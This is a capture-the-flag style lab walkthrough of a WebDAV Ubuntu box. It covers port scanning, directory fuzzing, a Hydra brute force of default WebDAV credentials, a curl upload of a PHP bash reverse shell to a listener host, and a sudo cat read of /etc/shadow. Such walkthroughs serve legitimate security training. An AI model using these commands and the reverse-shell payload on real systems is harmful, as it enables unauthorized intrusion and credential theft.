# bsidesgtdav

**Status:** Completed
**Target:** `$TARGET`
**OS:** Linux (Ubuntu)
**Difficulty:** Easy
**Tech stack:** Apache 2.4.18, WebDAV

## Recon
```bash
nmap -sS -n -Pn --min-rate 5000 -p- --open $TARGET -oN silent
nmap -sVC -p80 $TARGET -oN service
```
**Output**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

## Web Enumeration

```bash
ffuf -u http://$TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

**Output**
```
webdav [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 23ms]
```

## WebDAV Default Credential Brute Force

A WebDAV service was found behind HTTP Basic Auth. A small list of default usernames was tested as both user and password with Hydra.

```bash
## Default user list
wampp webdav jigsaw xampp
hydra -L webdav-users.txt  -P webdav-users.txt 10.130.148.83 http-get /webdav
```
**Output**
```
[DATA] attacking http-get://10.130.148.83:80/webdav
[80][http-get] host: 10.130.148.83   login: wampp   password: xampp
```

### The WebDAV share contained a `passwd.dav` file

**Output**
```
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```
The hash is Apache MD5 (APR1) — it matches the credentials already recovered.

### File Upload Test
```bash
curl -u wampp:xampp -T service http://10.130.148.83/webdav/
```
The file uploaded successfully — a PHP reverse shell can be planted.

```bash
echo  '<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/8080 0>&1'");
?>' >> reverse.php
nc -nlvp 8080
curl -u wampp:xampp -T reverse.php http://10.130.148.83/webdav/
```

### Initial Shell as www-data
```bash
whoami
id
groups
cat /etc/passwd | grep bash
sudo -l
```

**Output**
```
root:x:0:0:root:/root:/bin/bash                                                             
merlin:x:1000:1000:dav,,,:/home/merlin:/bin/bash                                            
wampp:x:1001:1001:webdav,,,:/home/wampp:/bin/bash    

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat                                      
```

### Privilege Escalation — sudo cat
The `www-data` user can run `cat` as root via sudo — direct arbitrary file read.

```bash
/bin/cat /etc/shadow
/bin/cat /root/root.txt
```

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [ffuf](../../../tools/fuzz/ffuf.md)
- [hydra](../../../tools/creds/hydra.md)
- [curl](../../../tools/web/curl.md)
- [netcat](../../../tools/pivot/netcat.md)
- [WebDAV upload to PHP RCE](../../../exploits/network-services/webdav-upload-rce.md)
- [sudo cat arbitrary file read](../../../privesc/linux/sudo-cat-file-read.md)
- [PHP exec Bash reverse shell](../../../payloads/reverse-shells/php-exec-bash.md)
